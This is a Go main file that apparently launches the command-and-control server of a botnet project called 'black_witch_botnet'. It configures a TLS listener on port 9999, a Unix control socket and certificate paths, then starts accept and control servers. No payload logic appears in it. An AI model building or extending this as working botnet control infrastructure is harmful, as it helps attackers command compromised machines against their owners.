package main

import (
	"flag"
	"black_witch_botnet/server"
)

func main() {
	acceptAddr := flag.String("addr-accept", ":9999", "Server address")
	controlSock := flag.String("sock-control", "../../tmp/unix.sock", "Control address")
	cert := flag.String("cert", "../../crypt/server.crt", "Server tls cert")
	key := flag.String("key", "../../crypt/server.key", "Server tls key")
	flag.Parse()

	s := &server.AcceptServer{
		Addr: *acceptAddr,
		Cert: *cert,
		Key:  *key,
	}

	c := &server.ControlServer{
		Sock: *controlSock,
	}

	r := &server.Runner{
		Accept:  s,
		Control: c,
	}

	r.Run()
}
